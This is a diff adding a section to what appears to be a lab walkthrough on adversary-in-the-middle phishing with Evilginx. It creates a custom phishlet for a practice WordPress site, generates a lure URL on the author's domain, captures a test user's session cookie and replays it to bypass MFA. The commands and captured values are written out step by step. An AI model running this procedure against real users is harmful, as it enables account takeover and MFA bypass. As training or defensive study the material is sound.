@@ -225,3 +225,94 @@ and then successfully capture their login
 
 <img width="658" height="79" alt="Screenshot 2025-07-24 013931" src="https://github.com/user-attachments/assets/b6382756-2ff8-4fe0-8d60-c8c04ae923b5" />
 
+## Stealing Cookies
+<img width="1348" height="510" alt="Screenshot 2025-07-29 081947" src="https://github.com/user-attachments/assets/103b5f1b-cd00-4f31-beb8-ee0471dc9a83" />
+
+<img width="1151" height="602" alt="Screenshot 2025-07-29 081956" src="https://github.com/user-attachments/assets/563b5691-2b0c-4742-befe-384d819a9c97" />
+
+## Create a custom phishlet
+To steal cookies from a user logging into hacksmarter-manufacturing.shop, we first create a custom phishlet `hacksmarter.yaml` and place it inside of /evilginx/phishlets/.
+
+The phishlet will now appear as `hacksmarter`
+
+startup evilginx
+```
+./evilginx
+```
+
+Add your hostname (mine is khangtran.shop) to your new phishlet (hacksmarter)
+```
+phishlets hostname hacksmarter khangtran.shop
+```
+
+Disable the old phishlet and enable the one we just created
+```
+phishlets disable wordpress.org
+```
+```
+phishlets enable hacksmarter
+```
+<img width="756" height="89" alt="Screenshot 2025-07-24 015717" src="https://github.com/user-attachments/assets/9a5b6659-ba7a-4a50-b1db-d1c00e1d4fe5" />
+
+now create  lure for the new phishlet
+```
+lures create hacksmarter
+```
+
+```
+lures
+```
+
+output
+```
+: lures
+
++-----+----------------+-----------+------------+-------------+---------------+---------+-------+
+| id  |   phishlet     | hostname  |   path     | redirector  | redirect_url  | paused  |  og   |     
++-----+----------------+-----------+------------+-------------+---------------+---------+-------+     
+| 0   | wordpress.org  |           | /vVRBAqQA  |             |               |         | ----  |     
+| 1   | hacksmarter    |           | /VzJzLWOQ  |             |               |         | ----  |     
++-----+----------------+-----------+------------+-------------+---------------+---------+-------+     
+
+:  
+
+
+so now we have a new lure for the hacksmarter phishlet
+
+```
+lures get-url 1
+```
+```
+https://khangtran.shop/VzJzLWOQ
+```
+
+now login as tony
+```
+tony:HackSmarterKairos****!
+```
+
+<img width="803" height="453" alt="Screenshot 2025-07-24 020050" src="https://github.com/user-attachments/assets/30ac32bc-d1c0-4abb-a015-37f900baf95e" />
+
+Evilginx is serving the REAL website and user's will actually be able to login, but the information gets sent back to the attacker. This is a MITM attack.
+
+To see the tokens/cookies
+
+```
+sessions 2
+```
+
+<img width="818" height="376" alt="Screenshot 2025-07-24 020503" src="https://github.com/user-attachments/assets/0e8099b9-e5be-4fde-a597-d9954ba2507e" />
+
+
+```
+wordpress_sec_70f0acd5d721bc50354bb466194518b3
+```
+
+```
+tony%7C1753509619%7CmqrKnqB1rmD2eqY4sAuLGzPGc1H56bVk4fKP5tykm4Q%7Cacc1bfc66309f9fca5044ac7b88b17ea84011e250b51c005adf04ab372d53072
+```
+
+By inserting those values into the browser cookies using Developer Tools on the real site's login page, then refreshing the page,
+we gain access directly from an incognito Chrome window, effectively bypassing multi-factor authentication (MFA).
+
+<img width="1130" height="621" alt="Screenshot 2025-07-24 021148" src="https://github.com/user-attachments/assets/d3f4bba1-f4d0-4e96-8eb6-33ef3d5f7816" />
